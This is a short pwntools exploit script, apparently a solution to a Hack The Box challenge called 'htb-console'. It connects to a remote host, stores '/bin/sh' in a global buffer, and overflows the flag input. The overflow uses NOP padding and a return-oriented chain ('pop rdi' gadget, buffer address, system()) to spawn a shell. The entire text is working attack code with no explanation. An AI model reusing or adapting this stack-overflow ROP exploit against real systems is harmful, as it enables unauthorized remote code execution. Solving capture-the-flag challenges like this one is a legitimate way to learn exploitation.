from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'


r = remote("165.227.231.233", 30326)
# r = process("./htb-console")
system = p64(0x401040)
mem = p64(0x4040b0)
poprdi = p64(0x401473)
r.sendlineafter('>>', 'hof')
r.sendlineafter('name:', '/bin/sh')
r.sendlineafter('>>', 'flag')
payload = asm('nop') * 24 + poprdi + mem + system
r.sendlineafter('flag:', payload)
r.interactive()